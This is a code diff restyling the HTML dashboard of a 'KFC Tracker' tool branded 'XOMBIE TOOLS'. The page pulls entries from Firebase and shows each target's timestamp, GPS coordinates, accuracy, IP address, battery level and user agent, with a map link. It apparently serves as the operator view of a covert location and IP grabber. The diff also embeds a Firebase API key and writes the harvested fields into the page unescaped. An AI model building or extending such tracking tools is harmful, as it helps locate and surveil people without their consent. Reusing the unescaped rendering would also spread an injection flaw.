@@ -4,19 +4,67 @@
   <meta charset="UTF-8">
   <title>KFC Tracker Panel</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Creepster&family=Orbitron:wght@600&display=swap');
+
     body {
-      background: #000;
-      color: #0f0;
-      font-family: monospace;
+      background: radial-gradient(ellipse at top, #1b0035 0%, #000000 100%);
+      color: #ffffff;
+      font-family: 'Orbitron', sans-serif;
       padding: 20px;
+      margin: 0;
     }
+
+    h1 {
+      color: #00ffff;
+      text-align: center;
+      margin-bottom: 30px;
+      text-shadow: 0 0 10px #0ff, 0 0 20px #00f;
+    }
+
     .entry {
-      border: 1px solid #0f0;
-      padding: 10px;
-      margin-bottom: 10px;
+      background: rgba(25, 0, 50, 0.7);
+      border: 2px solid #9e00ff;
+      box-shadow: 0 0 15px #9e00ff, 0 0 30px #00ffff;
+      padding: 20px;
+      border-radius: 20px;
+      margin-bottom: 30px;
+      position: relative;
+      transition: transform 0.3s, box-shadow 0.3s;
     }
+
+    .entry:hover {
+      transform: scale(1.03);
+      box-shadow: 0 0 30px #00ffff, 0 0 50px #9e00ff;
+    }
+
+    .label {
+      font-weight: bold;
+      color: #ff00c8;
+      text-shadow: 0 0 5px #f0f;
+    }
+
     .entry a {
-      color: #0ff;
+      color: #00ffff;
+      text-decoration: none;
+    }
+
+    .entry a:hover {
+      text-decoration: underline;
+    }
+
+    .footer {
+      margin-top: 15px;
+      font-size: 14px;
+      font-family: 'Creepster', cursive;
+      color: #ff0055;
+      text-shadow: 0 0 5px red;
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+    }
+
+    .footer::before {
+      content: "☣️ Powered by XOMBIE TOOLS ☠️";
     }
   </style>
 </head>
@@ -29,7 +77,6 @@
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
 
   <script>
-    // Firebase Config
     const firebaseConfig = {
       apiKey: "AIzaSyCG7XY_KjzJkfLWtUSgarDLritenEbbvSY",
       authDomain: "kfc-tracker.firebaseapp.com",
@@ -41,18 +88,16 @@
       measurementId: "G-EPEXKK3S37"
     };
 
-    // Init Firebase
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-
     const panel = document.getElementById("locationPanel");
 
     db.ref("locations").on("value", (snapshot) => {
       const data = snapshot.val();
-      panel.innerHTML = ""; // Clear
+      panel.innerHTML = "";
 
       if (data) {
-        const entries = Object.values(data).reverse(); // Show latest first
+        const entries = Object.values(data).reverse();
 
         entries.forEach((entry, i) => {
           const lat = entry.latitude || "N/A";
@@ -66,15 +111,16 @@
 
           panel.innerHTML += `
             <div class="entry">
-              <b>#${i + 1}</b><br>
-              🕒 <b>Time:</b> ${timestamp}<br>
-              📍 <b>Latitude:</b> ${lat}<br>
-              📍 <b>Longitude:</b> ${lon}<br>
-              🎯 <b>Accuracy:</b> ${accuracy} m<br>
-              🌐 <b>IP:</b> ${ip}<br>
-              🔋 <b>Battery:</b> ${battery}<br>
-              🧠 <b>User Agent:</b> ${userAgent}<br>
+              <div class="label">#${i + 1}</div>
+              🕒 <span class="label">Time:</span> ${timestamp}<br>
+              📍 <span class="label">Latitude:</span> ${lat}<br>
+              📍 <span class="label">Longitude:</span> ${lon}<br>
+              🎯 <span class="label">Accuracy:</span> ${accuracy} m<br>
+              🌐 <span class="label">IP:</span> ${ip}<br>
+              🔋 <span class="label">Battery:</span> ${battery}<br>
+              🧠 <span class="label">User Agent:</span> ${userAgent}<br>
               🌍 <a href="${mapsLink}" target="_blank">Open in Google Maps</a>
+              <div class="footer"></div>
             </div>
           `;
         });
